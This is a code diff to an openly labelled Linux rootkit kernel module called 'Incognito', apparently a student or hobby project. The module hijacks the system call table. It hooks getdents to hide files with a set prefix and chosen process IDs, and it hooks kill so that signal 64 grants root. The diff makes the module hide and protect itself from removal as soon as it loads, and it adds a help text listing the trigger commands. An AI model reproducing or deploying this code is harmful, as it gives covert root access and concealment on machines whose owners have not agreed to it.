@@ -62,10 +62,12 @@ enum {
     SIGHIDE = 31,
     //signal to toggle protect module
     SIGPROTECT = 1,
-    //signal to grant root to a target process
+    //signal to grant root priveleges
     SIGROOT = 64,
     //signal to toggle the module to INCOGNITO MODE (hidden AND protected)
     SIGMODHIDE = 63,
+    //signal to print help to dmesg
+    SIGHELP = 2,
 };
 
 //linux_dirent struct
@@ -77,6 +79,21 @@ struct linux_dirent
     unsigned short  d_reclen;
     char            d_name[1];
 };
+
+void printHelp(void)
+{
+    //print off kernal module options to dmesg
+    printk(
+        "[INCOGNITO OPTIONS]...\n"
+        "RAW Kill Commands:\n"
+        "  kill -64 0              Grants root privelege.\n"
+        "  kill -31 [pid]          Toggles hiding the specified [pid].\n"
+        "  kill -63 0              Toggles hiding and protectection of the rootkit.\n"
+        "  kill -2 0               Print this help message.\n"
+        "  kill -1 0               Toggles rootkit removal protection.\n"
+        "The special prefix to hide files and directories is 'incognito_secret'.\n"
+        "Loading/unloading the module will toggle file hiding.\n");
+}
 
 // -----------------------SYSTEM CALL TABLE SECTION-----------------------------
 unsigned long** sys_call_table;
@@ -92,20 +109,13 @@ unsigned long** sys_call_table;
 //getdents is very important, hijacking it gets us hiding files and hiding processes
 //-----------------------------Original call list------------------------------
 asmlinkage long (*originalGetdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-//asmlinkage long (*originalRead)(unsigned int fd, char *buf, size_t count);
-//asmlinkage long (*originalOpen)(const char __user *filename, int flags, umode_t mode);
-//asmlinkage long (*originalLstat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
-//asmlinkage long (*originalStat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
 static asmlinkage long (*originalKill)(pid_t pid, int sig);
 
 //------------------------------Hijacked call list------------------------------
 asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-//asmlinkage long hijackedRead(unsigned int fd, char *buf, size_t count);
-//asmlinkage long hijackedOpen(const char __user *filename, int flags, umode_t mode);
-//asmlinkage long hijackedLstat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
-//asmlinkage long hijackedStat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
 static asmlinkage long hijackedKill(pid_t pid, int sig);
 
+//page tool code
 static int page_read_write(ulong address)
 {
         uint level;
@@ -136,9 +146,10 @@ int hidden = 0;
 
 void hide(void)
 {
-	if (hidden)
+    //if the module is hidden, return
+    if (hidden)
 		return;
-
+    //otherwise, remove the module from everywhere we don't want it to show up
 	while (!mutex_trylock(&module_mutex))
 		cpu_relax();
 	mod_list = THIS_MODULE->list.prev;
@@ -153,9 +164,10 @@ void hide(void)
 
 void reveal(void)
 {
+    //if the module is already not hidden, return
 	if (!hidden)
 		return;
-
+    //otherwise, reveal the module in the master list
 	while (!mutex_trylock(&module_mutex))
 		cpu_relax();
 	list_add(&THIS_MODULE->list, mod_list);
@@ -217,7 +229,7 @@ void root(void)
 	//creds->fsuid.val = 0;
 	//creds->fsgid.val = 0;
 
-	printk(KERN_WARNING "pid %d , %s is now root\n",task->pid,task->comm);
+	printk(KERN_WARNING "Incogntion: pid %d , %s is now root\n",task->pid,task->comm);
 
 	commit_creds(creds);
 
@@ -301,6 +313,7 @@ asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, uns
             return getdents;
     }
 
+    //Error check
     error = copy_from_user(ourDirp, dirp, getdents);
     if (error)
     {
@@ -310,16 +323,19 @@ asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, uns
     //define d_inode
     //4.x kernal so we use the following
     d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-
     if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
     {
         proc = 1;
     }
 
+    //While offset is < getdents we go in
     while (offset < getdents)
     {
+        //we actually hide by deleting the dirent and shifting the other dirents to cover
+        //this will render our target files and the given pid invis to any command that utilizes getdents
         directory = (void *)ourDirp + offset;
-        if ((!proc && (memcmp(INCOGNITO_PREFIX, directory->d_name, strlen(INCOGNITO_PREFIX)) == 0)) || (proc && isIncognito(simple_strtoul(directory->d_name, NULL, 10)))) {
+        if ((!proc && (memcmp(INCOGNITO_PREFIX, directory->d_name, strlen(INCOGNITO_PREFIX)) == 0))
+        || (proc && isIncognito(simple_strtoul(directory->d_name, NULL, 10)))) {
             if (directory == ourDirp){
                 getdents = getdents - directory->d_reclen;
                 memmove(directory, (void *)directory + directory->d_reclen, getdents);
@@ -334,10 +350,12 @@ asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, uns
 
     error = copy_to_user(dirp, ourDirp, getdents);
 
+    //Error sanity check
     if (error){
         goto exit;
     }
 
+//gotta free up ourDirp allocation before returning the new getdents
 exit:
     kfree(ourDirp);
     return getdents;
@@ -363,26 +381,26 @@ static asmlinkage long hijackedKill(pid_t pid, int signal)
     struct task_struct *task;
     switch (signal) {
         case SIGHIDE:
-        //hide the process
-        if ((task = fetchTask(pid)) == NULL){
-            return -ESRCH;
-        }
-        task->flags ^= INCOGNITO;
+            // togle hiding the process
+            if ((task = fetchTask(pid)) == NULL){
+                return -ESRCH;
+            }
+            task->flags ^= INCOGNITO;
             break;
         case SIGPROTECT:
-        //toggle just the protection
-        if (protected){
-            unprotect();
-        } else {
-            protect();
-        }
+            //toggle just the protection
+            if (protected){
+                unprotect();
+            } else {
+                protect();
+            }
             break;
         case SIGROOT:
-        //grant the process root
+            //grant the process root
             root();
             break;
         case SIGMODHIDE:
-        //hide and protect the module
+            //hide and protect the module aka "go incgonito"
             if (hidden){
                 reveal();
                 unprotect();
@@ -390,6 +408,10 @@ static asmlinkage long hijackedKill(pid_t pid, int signal)
                 hide();
                 protect();
             }
+            break;
+        case SIGHELP:
+            //print help message to dmesg
+            printHelp();
             break;
         default:
             return originalKill(pid, signal);
@@ -400,62 +422,64 @@ static asmlinkage long hijackedKill(pid_t pid, int signal)
 
 int __init incognito_init(void)
 {
+  //check if we are on a compatible kernal version
+  #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 4, 0)
+    printk(KERN_ERR "Incognito Error: Incompatible Kernel Version!\n Incognito only functions on 4.x kernel versions!\n");
+    return 0;
+  #endif
+
   //find system call table address
 	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
 	if (!sys_call_table){
-		printk(KERN_ERR "Incognito error: Can't find the system call table!!\n");
+		printk(KERN_ERR "Incognito Error: Can't find the system call table!!\n");
 		return -ENOENT;
 	} else {
 		printk("Incognito: System call table located!\n");
 		//print off the address of the system call table
-		printk(KERN_INFO "Sys call table address : %p\n", sys_call_table);
+		printk(KERN_INFO "Incognito: System Call Table Address - %p\n", sys_call_table);
 	}
 
-	//Start hidden and protected module
-	//hide();
-    //protect();
-    
+	//Start Incgontio hidden and protected
+	hide();
+    protect();
 
 	//System Calls
 	page_read_write((ulong)sys_call_table);
-	//HOOK(sys_call_table, originalOpen, hijackedOpen, __NR_open);
-	//HOOK(sys_call_table, originalLstat, hijackedLstat, __NR_lstat);
-	//HOOK(sys_call_table, originalStat, hijackedStat, __NR_stat);
 
     //hook getdents
     HOOK(sys_call_table, originalKill, hijackedKill, __NR_kill);
+
     //get getdents
     initializeHijack();
+
 	page_read_only((ulong)sys_call_table);
-	//Debug Print
-    printk("incognito: module loaded\n");
+
+	//Print a warning to dmesg
+    printk("WARNING\n"
+    "Incognito: Module Loaded\n"
+    "Incognito is a rootkit LKM!\n"
+    "It starts hidden and protected!\n"
+    "Be sure to properly unhide and remove!\n");
 
 	//we immediately reveal since we have no way to enter commands yet!
 	//if you remove this atm you won't be able to find incognito >:)
 	//reveal();
     //unprotect();
-
   return 0;
 }
 
 void __exit incognito_exit(void)
 {
-
 	//unhook our hijacked calls
 	page_read_write((ulong)sys_call_table);
-	//UNHOOK(sys_call_table, originalOpen, __NR_open);
-	//UNHOOK(sys_call_table, originalLstat, __NR_lstat);
-	//UNHOOK(sys_call_table, originalStat, __NR_stat);
-
     //Unhook getdents last (this unhides processes)
     UNHOOK(sys_call_table, originalKill, __NR_kill);
     //pull out of getdents
     exitHijack();
 	page_read_only((ulong)sys_call_table);
-
-
-    printk("incognito: module removed\n");
-
+    printk("Incognito: Module Removed\n"
+    "Incognito has successfuly revealed and removed itself!\n"
+    );
 
 }
 
